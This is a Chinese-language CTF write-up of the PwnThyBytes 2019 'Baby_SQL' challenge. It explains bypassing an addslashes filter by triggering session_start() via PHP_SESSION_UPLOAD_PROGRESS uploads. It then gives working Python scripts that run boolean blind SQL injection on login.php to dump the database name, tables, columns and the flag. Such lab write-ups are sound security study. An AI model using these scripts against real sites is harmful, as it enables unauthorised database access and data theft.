---
title: '[PwnThyBytes 2019]Baby_SQL'
date: 2024-10-16 19:33:01
tags:
      - sql注入
      - session
categories: 刷题笔记
---

### [PwnThyBytes 2019]Baby_SQL

我们打开页面源码，发现有个source.zip，我们访问它进行下载

![image-20241017191402754](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410171914847.png)

我们进行代码审计

我们发现在index.php里会对传入的值进行转义

![image-20241017191623318](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410171916368.png)

 addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。

<!--more-->

预定义字符是：

- 单引号（'）
- 双引号（"）
- 反斜杠（\）
- NULL

register和login都没有啥过滤，但register必须要为admin注册

![image-20241017192119051](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410171921081.png)

我们发现登录存在注入点

![image-20241017192303743](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410171923772.png)

我们可以通过username来进行注入，但前提是要先连接数据库

我们在login和register最上方代码发现要连接数据库，需要存在session

![image-20241017192341317](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410171923343.png)

session数组是在session_start()初始化后才产生，所以我们可以伪造一个session来直接访问login和register，从而绕过index的过滤，来进行sql注入

在phpsession里如果在php.ini中设置session.auto_start=On，那么PHP每次处理PHP文件的时候都会自动执行session_start()，但是session.auto_start默认为Off。与Session相关的另一个叫session.upload_progress.enabled，默认为On，在这个选项被打开的前提下我们在multipart POST的时候传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start()
这个方法同样可以用来进行文件包含和反序列化

我们来写个脚本

```
import requests

url = "http://6a742e0c-c6b0-49a3-b626-f5f0578d17f1.node3.buuoj.cn/templates/login.php"

files = {"file": "123456789"}
a = requests.post(url=url, files=files, data={"PHP_SESSION_UPLOAD_PROGRESS": "123456789"},
                  cookies={"PHPSESSID": "test1"}, params={'username': 'test', 'password': 'test'},
                  proxies={'http': "http://127.0.0.1:8080"})
print(a.text)

```

![image-20241017193241834](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410171932889.png)

返回try again

说明我们成功构造，就可以绕过index/php来注入了，login没有任何过滤，可以直接注入，但是没有回显，我们使用盲注

库名

ptbctf

表名

flag_tbl,ptbctf

字段名

flag_tbl：secret

ptbctf：username password

查flag_tbl的字段值即可

```
import requests
import time
url = "http://6a742e0c-c6b0-49a3-b626-f5f0578d17f1.node3.buuoj.cn/templates/login.php"

files = {"file": "123456789"}



'''字段值'''
flag=''
for i in range(1,100):
    low = 32
    high = 128
    mid = (low+high)//2
    while (low < high):
        time.sleep(0.06)
        # payload_flag ={'username': "test\" or (ascii(substr((select group_concat(username) from ptbctf ),{0},1))>{1}) #".format(i, mid),'password': 'test'}
        payload_flag = {
            'username': "test\" or (ascii(substr((select group_concat(secret) from flag_tbl ),{0},1))>{1}) #".format(i,mid),'password': 'test'}
        r = requests.post(url=url,params=payload_flag,files=files, data={"PHP_SESSION_UPLOAD_PROGRESS": "123456789"},
                  cookies={"PHPSESSID": "test1"})

        print(payload_flag)
        if '<meta http-equiv="refresh" content="0; url=?p=home" />' in r.text:
            low = mid +1
        else:
            high = mid
        mid = (low + high) // 2
    if(mid==32 or mid == 132):
        break
    flag +=chr(mid)
    print(flag)

print(flag)

# column=''
# for i in range(1,100):
#     low = 32
#     high = 128
#     mid = (low+high)//2
#     while (low < high):
#         time.sleep(0.06)
#         payload_column ={'username': "test\" or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\'flag_tbl\' ),{0},1))>{1}) #".format(i, mid),'password': 'test'}
#         r = requests.post(url=url,params=payload_column,files=files, data={"PHP_SESSION_UPLOAD_PROGRESS": "123456789"},
#                   cookies={"PHPSESSID": "test1"})
#
#         print(payload_column)
#         if '<meta http-equiv="refresh" content="0; url=?p=home" />' in r.text:
#             low = mid +1
#         else:
#             high = mid
#         mid = (low + high) // 2
#     if(mid==32 or mid == 132):
#         break
#     column +=chr(mid)
#     print(column)
#
# print(column)

# '''表名'''
# table=''
# for i in range(1,100):
#     low = 32
#     high = 128
#     mid = (low+high)//2
#     while (low < high):
#         time.sleep(0.06)
#         payload_table ={'username': 'test" or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=\'ptbctf\'),{0},1))>{1}) #'.format(i, mid),'password': 'test'}
#         r = requests.post(url=url,params=payload_table,files=files, data={"PHP_SESSION_UPLOAD_PROGRESS": "123456789"},
#                   cookies={"PHPSESSID": "test1"})
#         print(payload_table)
#         if '<meta http-equiv="refresh" content="0; url=?p=home" />' in r.text:
#             low = mid +1
#         else:
#             high = mid
#         mid = (low + high) // 2
#     if(mid==32 or mid == 132):
#         break
#     table+=chr(mid)
#     print(table)
#
# print(table)

# '''数据库名'''
# database=''
# for i in range(1,100):
#     low = 32
#     high = 128
#     mid = (low+high)//2
#     while (low < high):
#         time.sleep(0.06)
#         payload_database ={'username': 'test" or (ascii(substr((select database()),{0},1))>{1}) #'.format(i, mid),'password': 'test'}
#         r = requests.post(url=url,params=payload_database,files=files, data={"PHP_SESSION_UPLOAD_PROGRESS": "123456789"},
#                   cookies={"PHPSESSID": "test1"})
#         print(payload_database)
#         if '<meta http-equiv="refresh" content="0; url=?p=home" />' in r.text:
#             low = mid +1
#         else:
#             high = mid
#         mid = (low + high) // 2
#     if(mid==32 or mid == 132):
#         break
#     database+=chr(mid)
#     print(database)
#
# print(database)

```

得到flag

![image-20241017193646580](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410171936629.png)
